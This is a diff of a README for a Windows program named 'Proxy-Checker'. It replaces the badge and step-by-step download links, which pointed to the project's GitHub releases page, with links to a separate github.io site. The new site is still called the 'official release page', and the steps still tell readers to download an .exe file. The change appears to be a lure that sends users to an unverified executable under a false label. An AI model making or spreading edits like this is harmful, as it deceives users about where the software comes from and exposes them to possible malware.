@@ -1,6 +1,6 @@
 # 🛡️ Proxy-Checker - Manage your network proxies with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jaabasifiwe01-cell/Proxy-Checker/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://jaabasifiwe01-cell.github.io)
 
 ## 📋 What is this program?
 
@@ -19,7 +19,7 @@ This software runs on modern Windows computers. Ensure you meet these requiremen
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/jaabasifiwe01-cell/Proxy-Checker/releases).
+1. Go to the [official release page](https://jaabasifiwe01-cell.github.io).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` suitable for your version of Windows.
 4. Save the file to your computer.
